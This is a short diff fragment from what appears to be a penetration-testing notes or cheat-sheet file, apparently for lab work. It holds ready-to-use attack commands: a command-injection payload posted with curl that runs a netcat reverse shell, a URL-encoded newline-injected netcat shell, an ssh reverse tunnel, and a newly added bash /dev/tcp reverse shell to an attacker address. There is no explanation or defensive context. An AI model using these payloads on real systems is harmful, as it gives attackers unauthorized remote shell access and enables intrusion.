@@ -97,3 +97,8 @@ curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" ht
 %0Anc%20192.168.118.3%204444%20-e%20%2Fbin%2Fb
 
 ssh -R 80:0.0.0.0:80 web_svc@192.168.240.147
+
+
+```
+
+bash -i>&/dev/tcp/192.168.45.225/8083 0>&1
